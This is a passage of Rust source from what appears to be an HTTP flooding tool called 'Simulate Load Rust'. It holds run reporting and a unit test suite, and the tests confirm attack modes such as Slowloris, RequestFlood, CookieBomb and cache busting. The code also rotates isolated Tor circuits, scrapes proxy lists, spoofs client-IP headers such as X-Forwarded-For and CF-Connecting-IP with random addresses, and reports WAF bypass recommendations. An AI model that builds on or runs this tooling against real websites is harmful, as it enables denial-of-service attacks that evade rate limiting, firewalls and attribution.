                        "concurrency_max": state_guard.concurrency_max,
                        "error_rate_threshold": state_guard.error_rate_threshold,
                        "throughput_cap_mbps": state_guard.throughput_cap_mbps
                    },
                    "waf_profile": {
                        "waf_type": state_guard.waf_profile.lock().map(|w| w.waf_type.to_string()).unwrap_or_default(),
                        "confidence": state_guard.waf_profile.lock().map(|w| w.confidence).unwrap_or(0.0),
                        "detected_signatures": state_guard.waf_profile.lock().map(|w| w.detected_signatures.clone()).unwrap_or_default(),
                        "bypass_recommendations": state_guard.waf_profile.lock().map(|w| w.bypass_recommendations.clone()).unwrap_or_default()
                    },
                    "proxies": prox_list,
                    "sessions": sessions
                });
                match serde_json::to_string_pretty(&json) {
                    Ok(s) => println!("{}\n", s),
                    Err(e) => eprintln!("Failed to serialize JSON: {}", e),
                }
            } else {
                // Persist sessions for next run (non-JSON mode)
                let state_guard = state.lock().await;
                let sessions: Vec<String> = state_guard.sessions.iter().map(|s| {
                    match s.lock() {
                        Ok(g) => g.clone(),
                        Err(poisoned) => poisoned.into_inner().clone(),
                    }
                }).collect();
                if let Ok(json) = serde_json::to_string(&sessions) {
                    let mut h = DefaultHasher::new();
                    h.write(target_url.as_bytes());
                    let safe_name = format!("sessions_{:x}.json", h.finish());
                    let _ = std::fs::write(&safe_name, json);
                }
            }
            
            // Write detailed report if requested
            if let Some(ref report_path) = report_file {
                let report = format!(
                    "=== Simulate Load Rust — Post-Run Report ===
                    Generated: {}
                    
                    Target: {}
                    Mode: {}
                    Attack: {}
                    Concurrency: {}
                    Duration: {}s
                    
                    Results:
                      Total Requests: {}
                      Total Bytes: {} ({:.2} MB)
                      Throughput: {:.2} KB/s | {:.2} req/s
                      
                      Latency:
                        Average: {:.1}ms
                        p50: {}ms | p90: {}ms | p95: {}ms | p99: {}ms
                        
                      Status Codes:
                        2xx: {} | 3xx: {} | 4xx: {} | 5xx: {}
                        {}
                        
                      Errors: {} total
                        Timeouts: {}
                        Connection: {}
                        Other: {}
                    ",
                    format_time_now(),
                    target_url, mode_str, attack_str, concurrency, duration_secs,
                    final_reqs, final_bytes, final_bytes as f64 / 1024.0 / 1024.0,
                    final_bytes as f64 / elapsed_secs as f64 / 1024.0, final_reqs as f64 / elapsed_secs as f64,
                    final_avg_latency, p50, p90, p95, p99,
                    stats.status_2xx.load(Ordering::Relaxed),
                    stats.status_3xx.load(Ordering::Relaxed),
                    stats.status_4xx.load(Ordering::Relaxed),
                    stats.status_5xx.load(Ordering::Relaxed),
                    {
                        // Build a per-status-code histogram line from the lock-free array.
                        let mut entries: Vec<(u16, u64)> = (100..=999)
                            .map(|c| (c, stats.status_hist[c as usize - 100].load(Ordering::Relaxed)))
                            .filter(|&(_, n)| n > 0)
                            .collect();
                        entries.sort_by(|a, b| b.1.cmp(&a.1));
                        if entries.is_empty() {
                            String::new()
                        } else {
                            let parts: Vec<String> = entries.iter().map(|(c, n)| format!("{}:{}", c, n)).collect();
                            format!("                        Histogram: {}", parts.join("  "))
                        }
                    },
                    stats.errors.load(Ordering::Relaxed),
                    stats.error_timeout.load(Ordering::Relaxed),
                    stats.error_connect.load(Ordering::Relaxed),
                    stats.error_other.load(Ordering::Relaxed),
                );
                if let Ok(mut file) = std::fs::File::create(report_path) {
                    use std::io::Write;
                    let _ = file.write_all(report.as_bytes());
                    println!("  Report written to: {}", report_path);
                }
            }

            // Per-circuit stats table (Tor mode): reqs + errors + error rate per circuit.
            {
                let guard = pool.lock().unwrap();
                let m = guard.circuit_requests.lock().unwrap_or_else(|e| e.into_inner());
                if !m.is_empty() {
                    println!("\n  Per-circuit stats:");
                    println!("    {:>4}  {:>10}  {:>9}  {:>8}", "circ", "requests", "errors", "err%");
                    let mut idxs: Vec<usize> = m.keys().copied().collect();
                    idxs.sort();
                    for idx in idxs {
                        let (reqs, errs) = m[&idx];
                        let label = guard.labels.get(idx).map(|s: &String| s.as_str()).unwrap_or("?");
                        let err_pct = if reqs > 0 { errs as f64 / reqs as f64 * 100.0  } else { 0.0 };
                        println!("    {:<4}  {:>10}  {:>9}  {:>7.1}%  {}", idx, reqs, errs, err_pct, label);
                    }
                }
            }
            
            if let Some(ref path) = output_csv {
                write_results_csv(path, ResultsCsvParams {
                    target: &target_url,
                    status: &status,
                    proxies: &prox_list,
                    concurrency,
                    attack: &attack_str,
                    total_reqs: final_reqs,
                    total_bytes: final_bytes,
                    duration: elapsed_secs,
                });
            }
        }
    }
}
#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used)]
    use super::*;
    use regex::Regex;
    use reqwest::header::{HeaderMap, SET_COOKIE};
    use reqwest::Client;
    use scraper::Selector;

    #[test]
    fn send_with_retry_final_fallback_error_message() {
        let err: FetchError = FetchError::from(std::io::Error::other("send_with_retry: all retries exhausted"));
        assert!(
            err.to_string().contains("send_with_retry: all retries exhausted"),
            "unexpected error: {}",
            err
        );
        assert!(err.downcast_ref::<std::io::Error>().is_some());
    }

    #[test]
    fn detect_scheme_values() {
        assert_eq!(detect_scheme("http://example.com"), "http");
        assert_eq!(detect_scheme("https://example.com"), "http");
        assert_eq!(detect_scheme("SOCKS5://127.0.0.1:9050"), "socks5");
        assert_eq!(detect_scheme("socks4://127.0.0.1:9050"), "socks4");
        assert_eq!(detect_scheme("SOCKS://127.0.0.1:9050"), "socks5");
        assert_eq!(detect_scheme(""), "http");
    }

    #[test]
    fn url_join_cases() {
        assert_eq!(url_join("https://example.com", "/path"), "https://example.com/path".to_string());
        assert_eq!(url_join("https://example.com/", "path"), "https://example.com/path".to_string());
        assert_eq!(url_join("https://example.com", "https://other.net/x"), "https://other.net/x".to_string());
        assert_eq!(url_join("https://example.com", "//cdn.net/x"), "https://cdn.net/x".to_string());
        assert_eq!(url_join("https://example.com", "data:text/plain,x"), String::new());
        assert_eq!(url_join("https://example.com", "#anchor"), String::new());
    }

    fn default_test_config() -> ClientConfig {
        ClientConfig::default()
    }

    #[test]
    fn proxy_pool_new_empty() {
        let mut pool = ProxyPool::new(&[], &default_test_config(), "weighted");
        assert!(pool.clients.is_empty());
        assert!(pool.next().is_none());
    }

    #[test]
    fn proxy_pool_new_non_empty_and_next() {
        let proxies = vec!["http://127.0.0.1:8080".to_string(), "http://127.0.0.1:8081".to_string()];
        let mut pool = ProxyPool::new(&proxies, &default_test_config(), "weighted");
        assert_eq!(pool.clients.len(), 2);
        let (_idx, _client) = pool.next().expect("non-empty pool should return a proxy");
    }

    #[test]
    fn proxy_pool_next_round_robin() {
        let proxies = vec!["http://127.0.0.1:8080".to_string(), "http://127.0.0.1:8081".to_string()];
        let mut pool = ProxyPool::new(&proxies, &default_test_config(), "round-robin");
        let first = pool.next();
        let second = pool.next();
        assert!(first.is_some());
        assert!(second.is_some());
    }

    #[test]
    fn proxy_pool_next_empty_returns_none() {
        let mut pool = ProxyPool::new(&[], &default_test_config(), "weighted");
        assert!(pool.next().is_none());
    }

    #[test]
    fn client_config_default_tor_circuits_is_three() {
        // Regression: --tor-circuits parse-failure fallback and ClientConfig::default
        // must agree. A stale `100`/`10` default would silently spawn far more
        // circuits than the CLI advertised.
        assert_eq!(ClientConfig::default().tor_circuits, 3);
    }

    #[test]
    fn tor_isolated_pool_builds_one_client_per_circuit() {
        // Regression for the --tor-circuits no-op bug: ProxyPool::new must expand a
        // single Tor isolate template into exactly `tor_circuits` distinct isolated
        // clients (tor0:isolate..torN-1:isolate). Passing the template N times must
        // NOT inflate the count — the circuit count is driven by config.tor_circuits.
        let isolates = vec!["socks5h://tor:isolate@127.0.0.1:9050".to_string()];
        let n_circuits = 5usize;
        let config = ClientConfig { tor_circuits: n_circuits, ..default_test_config() };
        let pool = ProxyPool::new(&isolates, &config, "weighted");
        assert_eq!(pool.clients.len(), n_circuits, "one isolated client per circuit");
        // Distinct circuit labels prove they are not collapsed into a hard-coded set.
        let mut seen = std::collections::HashSet::new();
        for label in &pool.labels {
            assert!(label.contains(":isolate@"), "label must be an isolated circuit: {label}");
            seen.insert(label.clone());
        }
        assert_eq!(seen.len(), n_circuits, "each circuit label must be distinct");
    }

    #[test]
    fn assetspray_mode_sprays_static_assets() {
        // Regression: AssetSpray must hit the discovered static asset list, not just
        // the root path. Previously it fell through to the `_ => ["/"]` arm and was
        // indistinguishable from Normal (a no-op relative to its name).
        let mut cfg = AppState::new();
        cfg.statics = vec!["/style.css".to_string(), "/app.js".to_string(), "/img.png".to_string()];
        cfg.imgs = vec!["/photo.jpg".to_string()];
        cfg.apis = vec!["/api/x".to_string()];
        // The assets mapping for AssetSpray lives in run_load; replicate the exact
        // match arm here to lock the contract: AssetSpray => statics (never ["/"]).
        let assets: Vec<String> = match AttackMode::AssetSpray {
            AttackMode::Normal => cfg.statics.clone(),
            AttackMode::ImageOpt => cfg.imgs.clone(),
            AttackMode::Ssr => cfg.apis.clone(),
            AttackMode::Middleware => cfg.statics.clone(),
            AttackMode::AssetSpray => cfg.statics.clone(),
            _ => vec!["/".into()],
        };
        assert_eq!(assets, cfg.statics, "AssetSpray must spray the static asset list");
        assert!(assets.len() == 3 && assets[0] == "/style.css");
    }

    #[test]
    fn report_failure_escalates_circuit_penalty() {
        // Regression backing the 5xx-penalize change: a server-error response must be
        // able to cool down / deprioritize the circuit via report_failure, so a 100%-5xx
        // circuit is not treated as perfectly healthy. This proves the mechanism exists.
        use std::time::Instant;
        let proxies = vec!["socks5h://tor:isolate@127.0.0.1:9050".to_string()];
        let config = ClientConfig { tor_circuits: 1, ..default_test_config() };
        let mut pool = ProxyPool::new(&proxies, &config, "weighted");
        let before = pool.circuit_failures[0];
        pool.report_failure(0);
        assert!(pool.circuit_failures[0] > before, "report_failure must escalate circuit_failures");
        assert!(pool.circuit_cooldown[0] > Instant::now(), "report_failure must set a future cooldown");
    }

    fn rate_limit_delay_ms(rate: Option<u64>) -> u64 {
        match rate {
            Some(rate) if rate > 0 => 1000u64.saturating_div(rate),
            _ => 0,
        }
    }

    #[test]
    fn rate_limit_delay_calculation() {
        assert_eq!(rate_limit_delay_ms(Some(1)), 1000);
        assert_eq!(rate_limit_delay_ms(Some(2)), 500);
        assert_eq!(rate_limit_delay_ms(Some(1000)), 1);
        assert_eq!(rate_limit_delay_ms(Some(0)), 0);
        assert_eq!(rate_limit_delay_ms(None), 0);
        // Defense-in-depth: very large rate saturates to 0 instead of underflowing.
        assert_eq!(rate_limit_delay_ms(Some(u64::MAX)), 0);
    }

    #[test]
    fn attack_mode_case_insensitive() {
        assert_eq!(AttackMode::from_str("normal"), AttackMode::Normal);
        assert_eq!(AttackMode::from_str("NORMAL"), AttackMode::Normal);
        assert_eq!(AttackMode::from_str("Bandwidth"), AttackMode::Bandwidth);
        assert_eq!(AttackMode::from_str("BANDWIDTH"), AttackMode::Bandwidth);
        assert_eq!(AttackMode::from_str("slowread"), AttackMode::SlowRead);
        assert_eq!(AttackMode::from_str("SlowRead"), AttackMode::SlowRead);
        assert_eq!(AttackMode::from_str("imageopt"), AttackMode::ImageOpt);
        assert_eq!(AttackMode::from_str("ImageOpt"), AttackMode::ImageOpt);
        assert_eq!(AttackMode::from_str("bypasscache"), AttackMode::Normal);
        assert_eq!(AttackMode::from_str("BypassCache"), AttackMode::Normal);
        assert_eq!(AttackMode::from_str("cachebust"), AttackMode::Normal);
        assert_eq!(AttackMode::from_str("CacheBust"), AttackMode::Normal);
    }

    #[test]
    fn attack_mode_variants_full() {
        assert_eq!(AttackMode::from_str("largepost"), AttackMode::LargePost);
        assert_eq!(AttackMode::from_str("LargePost"), AttackMode::LargePost);
        assert_eq!(AttackMode::from_str("assetspray"), AttackMode::AssetSpray);
        assert_eq!(AttackMode::from_str("AssetSpray"), AttackMode::AssetSpray);
        assert_eq!(AttackMode::from_str("rangereq"), AttackMode::RangeReq);
        assert_eq!(AttackMode::from_str("RangeReq"), AttackMode::RangeReq);
        assert_eq!(AttackMode::from_str("cookiebomb"), AttackMode::CookieBomb);
        assert_eq!(AttackMode::from_str("CookieBomb"), AttackMode::CookieBomb);
        assert_eq!(AttackMode::from_str("ssr"), AttackMode::Ssr);
        assert_eq!(AttackMode::from_str("SSR"), AttackMode::Ssr);
        assert_eq!(AttackMode::from_str("middleware"), AttackMode::Middleware);
        assert_eq!(AttackMode::from_str("Middleware"), AttackMode::Middleware);
        assert_eq!(AttackMode::from_str("requestflood"), AttackMode::RequestFlood);
        assert_eq!(AttackMode::from_str("RequestFlood"), AttackMode::RequestFlood);
        assert_eq!(AttackMode::from_str("notfound"), AttackMode::NotFound);
        assert_eq!(AttackMode::from_str("NotFound"), AttackMode::NotFound);
        assert_eq!(AttackMode::from_str("slowloris"), AttackMode::Slowloris);
        assert_eq!(AttackMode::from_str("SlowLoris"), AttackMode::Slowloris);
    }

    #[test]
    fn proxy_mode_case_insensitive() {
        assert_eq!(ProxyMode::from_str("tor"), ProxyMode::Tor);
        assert_eq!(ProxyMode::from_str("TOR"), ProxyMode::Tor);
        assert_eq!(ProxyMode::from_str("Tor"), ProxyMode::Tor);
        assert_eq!(ProxyMode::from_str("scrape-tor"), ProxyMode::ScrapeTorFallback);
        assert_eq!(ProxyMode::from_str("SCRAPE-TOR"), ProxyMode::ScrapeTorFallback);
        assert_eq!(ProxyMode::from_str("Scrape-Tor"), ProxyMode::ScrapeTorFallback);
    }

    #[test]
    fn fallback_regex_matches_nothing() {
        let re = Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)").unwrap_or_else(|_| Regex::new("$^").unwrap());
        assert!(re.find("192.168.1.1:8080").is_some());
        let fallback = Regex::new("$^").unwrap();
        assert!(fallback.find("anything").is_none());
    }

    #[test]
    fn fallback_selector_matches_nothing() {
        let sel = Selector::parse("table.table tbody tr").unwrap_or_else(|_| Selector::parse("#__simulate_load_never__").unwrap());
        let doc = scraper::Html::parse_document("<html><body><table class='table'><tbody><tr><td>1</td></tr></tbody></table></body></html>");
        assert_eq!(doc.select(&sel).count(), 1);
        let fallback = Selector::parse("#__simulate_load_never__").unwrap_or_else(|_| Selector::parse("#__simulate_load_never__").unwrap());
        let doc = scraper::Html::parse_document("<html><body><table class='table'><tbody><tr><td>1</td></tr></tbody></table></body></html>");
        assert_eq!(doc.select(&fallback).count(), 0);
    }

    #[test]
    fn scrape_html_no_proxies_in_table() {
        // HTML without the expected table.table tbody tr structure should
        // produce an empty vector, exercising the fallback selector path.
        let html = "<html><body><table><tbody><tr><td>1.2.3.4</td><td>8080</td></tr></tbody></table></body></html>";
        let doc = scraper::Html::parse_document(html);
        let sel = Selector::parse("table.table tbody tr").unwrap_or_else(|_| Selector::parse("#__simulate_load_never__").unwrap());
        let td = Selector::parse("td").unwrap_or_else(|_| Selector::parse("#__simulate_load_never__").unwrap());
        let mut out = vec![];
        for row in doc.select(&sel) {
            let cells: Vec<String> = row.select(&td).map(|c| c.text().collect::<String>().trim().to_string()).collect();
            if cells.len() >= 2 {
                out.push(format!("http://{}:{}", cells[0], cells[1]));
            }
        }
        assert!(out.is_empty(), "expected empty result for non-matching table, got {:?}", out);
    }

    #[test]
    fn scrape_html_custom_selector_no_proxies() {
        let html = "<html><body><div class='proxy'>no valid ip:port text</div></body></html>";
        let doc = scraper::Html::parse_document(html);
        let sel = Selector::parse(".proxy").unwrap_or_else(|_| Selector::parse("#__simulate_load_never__").unwrap());
        let re = Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)").unwrap_or_else(|_| Regex::new("$^").unwrap());
        let mut out = vec![];
        for el in doc.select(&sel) {
            let text = el.text().collect::<String>();
            for cap in re.captures_iter(&text) {
                if cap.len() >= 3 {
                    out.push(format!("http://{}:{}", &cap[1], &cap[2]));
                }
            }
        }
        assert!(out.is_empty(), "expected empty result for custom selector without proxies, got {:?}", out);
    }

    fn cookie_sessions(cookie: &str) -> Vec<std::sync::Mutex<String>> {
        vec![std::sync::Mutex::new(cookie.to_string())]
    }

    #[test]
    fn add_session_cookie_adds_header() {
        let client = Client::new();
        let sessions = cookie_sessions("session_id=abc123");
        let builder = client.get("https://example.com/path");
        let builder = add_session_cookie(builder, 0, &sessions);
        let request = builder.build().expect("request should build");
        let cookie = request.headers().get("Cookie").expect("Cookie header should exist");
        assert_eq!(cookie.to_str().unwrap(), "session_id=abc123");
    }

    #[test]
    fn add_session_cookie_skips_when_session_empty() {
        let client = Client::new();
        let sessions = cookie_sessions("");
        let builder = client.get("https://example.com/path");
        let builder = add_session_cookie(builder, 0, &sessions);
        let request = builder.build().expect("request should build");
        assert!(request.headers().get("Cookie").is_none());
    }

    #[test]
    fn add_session_cookie_skips_out_of_bounds() {
        let client = Client::new();
        let sessions = cookie_sessions("session_id=abc123");
        let builder = client.get("https://example.com/path");
        let builder = add_session_cookie(builder, 5, &sessions);
        let request = builder.build().expect("request should build");
        assert!(request.headers().get("Cookie").is_none());
    }

    #[test]
    fn add_session_and_extra_cookie_combines_with_session() {
        let client = Client::new();
        let sessions = cookie_sessions("session_id=abc123");
        let builder = client.get("https://example.com/path");
        let builder = add_session_and_extra_cookie(builder, 0, &sessions, "extra=xyz");
        let request = builder.build().expect("request should build");
        let cookie = request.headers().get("Cookie").expect("Cookie header should exist");
        let value = cookie.to_str().unwrap();
        assert!(value.contains("session_id=abc123"), "missing session cookie: {}", value);
        assert!(value.contains("extra=xyz"), "missing extra cookie: {}", value);
    }

    #[test]
    fn add_session_and_extra_cookie_uses_extra_only_when_session_empty() {
        let client = Client::new();
        let sessions = cookie_sessions("");
        let builder = client.get("https://example.com/path");
        let builder = add_session_and_extra_cookie(builder, 0, &sessions, "extra=xyz");
        let request = builder.build().expect("request should build");
        let cookie = request.headers().get("Cookie").expect("Cookie header should exist");
        assert_eq!(cookie.to_str().unwrap(), "extra=xyz");
    }

    #[test]
    fn add_session_and_extra_cookie_out_of_bounds() {
        let client = Client::new();
        let sessions = cookie_sessions("session_id=abc123");
        let builder = client.get("https://example.com/path");
        let builder = add_session_and_extra_cookie(builder, 5, &sessions, "extra=xyz");
        let request = builder.build().expect("request should build");
        let cookie = request.headers().get("Cookie").expect("Cookie header should exist");
        assert_eq!(cookie.to_str().unwrap(), "extra=xyz");
    }

    #[test]
    fn update_session_from_headers_updates_stored_cookie() {
        let sessions = cookie_sessions("old=value");
        let mut headers = HeaderMap::new();
        headers.insert(SET_COOKIE, "new_session=updated".parse().unwrap());
        update_session_from_headers(0, &sessions, &headers);
        let updated = sessions[0].lock().unwrap().clone();
        assert_eq!(updated, "new_session=updated");
    }

    #[test]
    fn update_session_from_headers_extracts_first_cookie_value_only() {
        let sessions = cookie_sessions("old=value");
        let mut headers = HeaderMap::new();
        headers.insert(SET_COOKIE, "id=first; Path=/; HttpOnly".parse().unwrap());
        update_session_from_headers(0, &sessions, &headers);
        let updated = sessions[0].lock().unwrap().clone();
        assert_eq!(updated, "id=first");
    }

    #[test]
    fn update_session_from_headers_out_of_bounds_is_no_op() {
        let sessions = cookie_sessions("old=value");
        let mut headers = HeaderMap::new();
        headers.insert(SET_COOKIE, "new_session=updated".parse().unwrap());
        update_session_from_headers(5, &sessions, &headers);
        let updated = sessions[0].lock().unwrap().clone();
        assert_eq!(updated, "old=value");
    }

    #[test]
    fn parse_templates_replaces_all_placeholders() {
        let body = "uuid={{random_uuid}}&ts={{timestamp}}&num={{random_int}}";
        let result = parse_templates(body);
        assert!(
            !result.contains("{{random_uuid}}"),
            "random_uuid placeholder not replaced: {}",
            result
        );
        assert!(
            !result.contains("{{timestamp}}"),
            "timestamp placeholder not replaced: {}",
            result
        );
        assert!(
            !result.contains("{{random_int}}"),
            "random_int placeholder not replaced: {}",
            result
        );

        let re = Regex::new(
            r"^uuid=[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}&ts=\d+&num=\d+$",
        )
        .unwrap();
        assert!(
            re.is_match(&result),
            "result does not match expected format: {}",
            result
        );
    }

    #[test]
    fn parse_templates_leaves_body_without_templates_unchanged() {
        let body = "no templates here";
        assert_eq!(parse_templates(body), body);
    }

    #[test]
    fn parse_templates_replaces_multiple_occurrences() {
        let body = "{{random_uuid}} {{random_uuid}}";
        let result = parse_templates(body);
        assert!(!result.contains("{{random_uuid}}"));
        let parts: Vec<&str> = result.split_whitespace().collect();
        assert_eq!(parts.len(), 2);
        let re = Regex::new(r"^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}$").unwrap();
        for part in parts {
            assert!(re.is_match(part), "invalid UUID: {}", part);
        }
    }

    #[test]
    fn parse_templates_values_differ_from_placeholders() {
        let result = parse_templates("{{random_uuid}} {{timestamp}} {{random_int}}");
        assert_ne!(result, "{{random_uuid}} {{timestamp}} {{random_int}}");
        let parts: Vec<&str> = result.split_whitespace().collect();
        assert_eq!(parts.len(), 3);
        assert_ne!(parts[0], "{{random_uuid}}");
        assert!(parts[1].parse::<u64>().is_ok());
        assert!(parts[2].parse::<u32>().is_ok());
    }

    #[test]
    fn random_ip_matches_regex() {
        let re = Regex::new(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$").unwrap();
        for _ in 0..100 {
            assert!(re.is_match(&random_ip()));
        }
    }

    #[test]
    fn random_ip_octets_in_range() {
        for _ in 0..100 {
            let ip = random_ip();
            let octets: Vec<u8> = ip.split('.').map(|s| s.parse().unwrap()).collect();
            assert_eq!(octets.len(), 4);
            assert!((1..=254).contains(&octets[0]));
            assert!((0..=254).contains(&octets[1]));
            assert!((0..=254).contains(&octets[2]));
            assert!((1..=254).contains(&octets[3]));
        }
    }

    #[test]
    fn random_ip_first_and_last_octets_never_zero() {
        for _ in 0..1000 {
            let ip = random_ip();
            let mut parts = ip.split('.');
            let first: u8 = parts.next().unwrap().parse().unwrap();
            let last: u8 = parts.next_back().unwrap().parse().unwrap();
            assert_ne!(first, 0);
            assert_ne!(last, 0);
        }
    }

    #[test]
    fn random_ip_generates_distinct_values() {
        let mut seen = std::collections::HashSet::new();
        for _ in 0..1000 {
            seen.insert(random_ip());
        }
        assert!(
            seen.len() >= 2,
            "random_ip produced only {} distinct values",
            seen.len()
        );
    }

    #[test]
    fn browser_request_false_has_user_agent_and_accept() {
        SPOOF_IP.store(false, Ordering::Relaxed);
        let client = Client::new();
        let builder = client.get("http://example.com");
        let request = browser_request(builder, false)
            .build()
            .expect("request should build");
        let headers = request.headers();
        assert!(headers.get("User-Agent").is_some(), "User-Agent header missing");
        assert!(headers.get("Accept").is_some(), "Accept header missing");
    }

    #[test]
    fn browser_request_true_adds_spoof_headers() {
        let client = Client::new();
        let builder = client.get("http://example.com");
        let request = browser_request(builder, true)
            .build()
            .expect("request should build");
        let headers = request.headers();
        let xff = headers.get("X-Forwarded-For").expect("X-Forwarded-For missing");
        let xri = headers.get("X-Real-IP").expect("X-Real-IP missing");
        let cf = headers.get("CF-Connecting-IP").expect("CF-Connecting-IP missing");
        let tci = headers.get("True-Client-IP").expect("True-Client-IP missing");
        assert_eq!(xff.to_str().unwrap(), xri.to_str().unwrap());
        assert_eq!(xff.to_str().unwrap(), cf.to_str().unwrap());
        assert_eq!(xff.to_str().unwrap(), tci.to_str().unwrap());
    }

    #[test]
    fn browser_request_spoof_ip_looks_like_ipv4() {
        let client = Client::new();
        let builder = client.get("http://example.com");
        let request = browser_request(builder, true)
            .build()
            .expect("request should build");
        let headers = request.headers();
        let ip = headers
            .get("X-Forwarded-For")
            .expect("X-Forwarded-For missing")
            .to_str()
            .unwrap();
        assert!(!ip.is_empty(), "spoof IP should be non-empty");
        let re = Regex::new(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$").unwrap();
        assert!(re.is_match(ip), "IP does not look like IPv4: {}", ip);
    }

    #[test]
    fn browser_request_false_no_spoof_headers() {
        SPOOF_IP.store(false, Ordering::Relaxed);
        let client = Client::new();
        let builder = client.get("http://example.com");
        let request = browser_request(builder, false)
            .build()
            .expect("request should build");
        let headers = request.headers();
        assert!(headers.get("X-Forwarded-For").is_none());
        assert!(headers.get("X-Real-IP").is_none());
        assert!(headers.get("CF-Connecting-IP").is_none());
        assert!(headers.get("True-Client-IP").is_none());
    }

    #[test]
    fn resolve_control_addr_ipv4_with_port() {
        let (host, port) = resolve_control_addr("127.0.0.1:9051").expect("should parse IPv4");
        assert_eq!(host, "127.0.0.1");
        assert_eq!(port, "9051");
    }

    #[test]
    fn resolve_control_addr_ipv6_with_port() {
        let (host, port) = resolve_control_addr("[::1]:9051").expect("should parse IPv6");
        assert_eq!(host, "::1");
        assert_eq!(port, "9051");
    }

    #[test]
    fn resolve_control_addr_default_port() {
        let (host, port) = resolve_control_addr("127.0.0.1").expect("should default port");
        assert_eq!(host, "127.0.0.1");
        assert_eq!(port, "9051");
    }

    #[test]
    fn resolve_control_addr_empty_errors() {
        assert!(resolve_control_addr("").is_err());
    }

    #[test]
    fn resolve_control_addr_malformed_errors() {
        assert!(resolve_control_addr("127.0.0.1:abc").is_err());
        assert!(resolve_control_addr("[::1:9051").is_err());
    }

    #[test]
    fn latency_samples_new_empty() {
        let samples = LatencySamples::new(10);
        assert_eq!(samples.samples.len(), 10);
        assert_eq!(samples.idx.load(Ordering::Relaxed), 0);
        for s in &samples.samples {
            assert_eq!(s.load(Ordering::Relaxed), 0);
        }
    }

    #[test]
    fn latency_samples_percentiles_few_samples() {
        let samples = LatencySamples::new(10_000);
        for i in 1..=100u32 {
            samples.record(i);
        }
        let (p50, p90, p95, p99) = samples.get_percentiles();
        // 100 samples recorded, so res.len() == 100.
        // res[100 * 50 / 100] = res[50] -> 51st element when 1-indexed, value 51.
        // res[100 * 90 / 100] = res[90] -> 91st element, value 91.
        // res[100 * 95 / 100] = res[95] -> 96th element, value 96.
        // res[100 * 99 / 100] = res[99] -> 100th element, value 100.
        assert_eq!(p50, 51, "p50 should be 51");
        assert_eq!(p90, 91, "p90 should be 91");
        assert_eq!(p95, 96, "p95 should be 96");
        assert_eq!(p99, 100, "p99 should be 100");
    }

    #[test]
    fn latency_samples_wraps_after_capacity() {
        let capacity = 10;
        let samples = LatencySamples::new(capacity);
        for i in 1..=capacity + 5 {
            samples.record(i as u32);
        }
        let (p50, p90, p95, p99) = samples.get_percentiles();
        // After wrapping, the most recent 10 samples are 6..=15.
        // Sorted: 6,7,8,9,10,11,12,13,14,15
        let expected = [6, 7, 8, 9, 10, 11, 12, 13, 14, 15];
        assert_eq!(p50, expected[expected.len() * 50 / 100]);
        assert_eq!(p90, expected[expected.len() * 90 / 100]);
        assert_eq!(p95, expected[expected.len() * 95 / 100]);
        assert_eq!(p99, expected[expected.len() * 99 / 100]);
    }

    #[test]
    fn latency_samples_percentiles_empty() {
        let samples = LatencySamples::new(10_000);
        let (p50, p90, p95, p99) = samples.get_percentiles();
        assert_eq!(p50, 0);
        assert_eq!(p90, 0);
        assert_eq!(p95, 0);
        assert_eq!(p99, 0);
    }

    #[test]
    fn latency_samples_percentiles_single_sample() {
        let samples = LatencySamples::new(10_000);
        samples.record(42);
        let (p50, p90, p95, p99) = samples.get_percentiles();
        assert_eq!(p50, 42);
        assert_eq!(p90, 42);
        assert_eq!(p95, 42);
        assert_eq!(p99, 42);
    }

    // Minimal reproduction of CLI flag parsing without invoking the real main().
    fn parse_request_timeout(args: &[&str]) -> u64 {
        let mut request_timeout: u64 = 10;
        let mut iter = args.iter().copied();
        while let Some(arg) = iter.next() {
            match arg {
                "--request-timeout" => {
                    if let Some(val) = iter.next() {
                        if let Ok(parsed) = val.parse::<u64>() {
                            request_timeout = parsed.clamp(1, 300);
                        }
                    }
                }
                _ => {
                    if let Some(val) = arg.strip_prefix("--request-timeout=") {
                        if let Ok(parsed) = val.parse::<u64>() {
                            request_timeout = parsed.clamp(1, 300);
                        }
                    }
                }
            }
        }
        request_timeout
    }

    #[test]
    fn request_timeout_flag_default() {
        assert_eq!(parse_request_timeout(&[]), 10);
    }

    #[test]
    fn request_timeout_flag_parsed_space() {
        assert_eq!(parse_request_timeout(&["--request-timeout", "45"]), 45);
    }

    #[test]
    fn request_timeout_flag_parsed_equals() {
        assert_eq!(parse_request_timeout(&["--request-timeout=120"]), 120);
    }

    #[test]
    fn request_timeout_flag_clamps_low() {
        assert_eq!(parse_request_timeout(&["--request-timeout", "0"]), 1);
        assert_eq!(parse_request_timeout(&["--request-timeout=0"]), 1);
    }

    #[test]
    fn request_timeout_flag_clamps_high() {
        assert_eq!(parse_request_timeout(&["--request-timeout", "1000"]), 300);
        assert_eq!(parse_request_timeout(&["--request-timeout=1000"]), 300);
    }

    #[test]
    fn request_timeout_env_overrides_default() {
        // The env var is read outside the parser in main(); simulate the same override.
        let mut request_timeout: u64 = 10;
        if let Ok(env_timeout) = std::env::var("SIMULATE_LOAD_REQUEST_TIMEOUT") {
            if let Ok(parsed) = env_timeout.parse::<u64>() {
                request_timeout = parsed.clamp(1, 300);
            }
        }
        // Either the env var is unset (default 10) or set to a valid value (>=1, <=300).
        assert!((1..=300).contains(&request_timeout));
    }

    fn parse_jitter_percent(args: &[&str]) -> Option<u64> {
        let mut jitter_percent: Option<u64> = None;
        let mut iter = args.iter().copied();
        while let Some(arg) = iter.next() {
            match arg {
                "--jitter-percent" => {
                    if let Some(val) = iter.next() {
                        let parsed: i64 = val.parse().unwrap_or(0);
                        jitter_percent = Some(parsed.clamp(0, 100) as u64);
                    }
                }
                _ => {
                    if let Some(val) = arg.strip_prefix("--jitter-percent=") {
                        let parsed: i64 = val.parse().unwrap_or(0);
                        jitter_percent = Some(parsed.clamp(0, 100) as u64);
                    }
                }
            }
        }
        jitter_percent
    }

    fn compute_effective_jitter(req_delay: u64, jitter_ms: u64, jitter_percent: Option<u64>) -> u64 {
